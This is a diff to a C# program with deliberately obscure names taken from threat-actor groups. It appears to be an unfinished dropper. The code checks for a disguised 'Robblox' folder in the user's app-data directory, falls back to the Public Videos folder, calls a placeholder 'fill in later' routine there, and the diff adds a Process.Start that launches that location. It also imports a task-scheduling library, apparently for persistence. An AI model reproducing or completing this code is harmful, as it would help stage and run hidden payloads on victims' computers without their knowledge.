@@ -4,6 +4,7 @@ using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using Microsoft.Win32.TaskScheduler;
+using System.Diagnostics;
 
 
 public class Iron_man
@@ -14,14 +15,18 @@ public class Iron_man
     }
     private static void Pink_Sandstorm()
     {
-        bool ACTINIUM = Roasted_0ktapus.Captain_America($"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox");
+        string Minerva;
+        bool ACTINIUM = Roasted_0ktapus.Captain_America($"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox"); 
         if(ACTINIUM){
-            Roasted_0ktapus.Melkor("fill in later", $"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox");
+            Roasted_0ktapus.Melkor("fill in later", $"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox"); // ======================================================
+            Minerva = $"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox";
         }
         else
         {
-            Roasted_0ktapus.Melkor("fill in later","C:\\Users\\Public\\Videos");
+            Roasted_0ktapus.Melkor("fill in later","C:\\Users\\Public\\Videos");  // ---------------------------------------------------
+            Minerva = "C:\\Users\\Public\\Videos";
         }
+        Process.Start(@$"{Minerva}");
     }
 }
 
